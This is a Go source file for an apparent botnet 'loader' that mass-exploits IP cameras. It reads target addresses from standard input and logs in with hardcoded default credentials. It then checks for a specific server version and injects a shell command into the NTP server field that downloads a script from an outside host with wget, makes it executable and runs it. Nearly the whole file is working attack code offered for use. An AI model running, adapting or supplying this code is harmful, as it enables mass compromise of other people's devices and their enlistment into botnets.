// known working ports are 80, 81, 8080
/*

loader made by Prodigy and dorks found by benshii.

*/

package main

import (
	"fmt"
	"bufio"
	"os"
	"net"
	"time"
	"strings"
	"strconv"
)

var (
	payload = "action=update&ipcamSource=%2Fntp.asp%3Fr%3D20130724&NTP_enable=1&NTP_serverName=%3b$(cd+/tmp%3b+wget+http%3a//1.1.1.1/sh%3b+chmod+777+sh%3b+sh+sh)&NTP_tzCityNo=16&NTP_tzMinute=0&NTP_daylightSaving=0"
	found = 0
	connections = 0
	connections_failed = 0
)

func check_version(conn net.Conn) bool {
	var buffer = [256]byte{}

	len, err := conn.Read(buffer[:])
	if len == 0 || err != nil {
		//fmt.Println("failed on read");
		return false
	}

	//fmt.Println(string(buffer[:]))

	return (strings.Contains(string(buffer[:]), "1.4.28") && strings.Contains(string(buffer[:]), "200"))
}

func exploit(target string) {
	//fmt.Println(target)
	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		connections_failed++
		return
	}

	connections++

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: "+ target +"\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n"))

	if check_version(conn) {
		found++
		fmt.Println("address:", target)
		conn.Write([]byte("POST /camera-cgi/admin/param.cgi HTTP/1.1\r\nHost: "+ target +"\r\nContent-Length: "+ strconv.Itoa(len(payload)) +"\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://"+ target +"/ntp.asp?r=20140408_1683324821461\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n"+ payload +"\r\n\r\n"))
	}
}

func main() {
	go func() {
		for {
			fmt.Println("connections:", connections, "failed connections:", connections_failed, "found:", found)
			time.Sleep(time.Second)
		}
	}()

	for {
		scanner := bufio.NewScanner(bufio.NewReader(os.Stdin))
		for scanner.Scan() {
			go exploit(scanner.Text() + ":" + os.Args[1])
		}
	}
}
